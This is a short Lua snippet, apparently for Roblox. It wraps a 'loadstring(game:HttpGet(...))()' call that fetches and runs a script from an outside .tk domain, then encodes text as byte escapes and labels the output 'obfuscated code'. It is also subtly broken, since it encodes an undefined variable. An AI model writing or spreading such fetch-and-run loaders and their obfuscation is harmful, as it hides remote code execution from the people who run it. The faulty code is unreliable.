local Code = [[
loadstring(game:HttpGet(("https://klnx.tk/code/dependencies_LUA.lua"), true))()
]]

local Encoded = link:gsub(".", function(zen) return "\\" .. zen:byte() end) or link .. "\""
print(Encoded) -- this is the obfuscated code